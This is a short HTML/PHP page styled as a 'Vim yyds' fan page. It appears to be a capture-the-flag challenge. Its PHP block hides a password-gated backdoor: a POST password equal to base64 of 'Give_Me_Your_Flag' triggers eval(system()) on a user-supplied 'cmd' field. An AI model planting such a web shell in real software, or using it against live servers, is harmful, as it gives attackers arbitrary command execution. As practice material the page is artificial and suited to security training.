<html>

<head>
    <meta charset="UTF-8">
    <style type="text/css">
        body,
        html {
            display: flex;
            align-items: center;
            justify-content: center;
        }

        div.vim {
            display: flex;
            align-content: center;
            vertical-align: middle;
            justify-content: center;
        }

        img {
            border: none;
            width: 8rem;
            height: auto;
        }

        h1.vim_yyds {
            color: #50f728;
            display: flex;
            align-items: flex-start;
            justify-content: center;
            margin-top: 50;
            margin-left: 5px;
        }

        h3.vim_said {
            color: #39c2ff;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        br,
        p {
            font-size: 20;
        }
    </style>
</head>

<body>
    <main>
        <div class="vim">
            <img src="https://www.bing.com/th?id=OSAAS.7B95FA2D97CE022F5E7949F60E350A25&pid=TechQna"></img>
            <h1 class="vim_yyds">
                Vim yyds
            </h1>
        </div>
        <h3 class="vim_said">
            队里师傅说Vim是世界上最好的编辑器，不接受反驳
        </h3>
        <div class="can_can_vim">
            <?php
            error_reporting(0);
            $password = "Give_Me_Your_Flag";
            echo "<p>can can need Vim </p>";
            if ($_POST['password'] === base64_encode($password)) {
                echo "<p>Oh You got my password!</p>";
                eval(system($_POST['cmd']));
            }
            ?>
        </div>
    </main>
</body>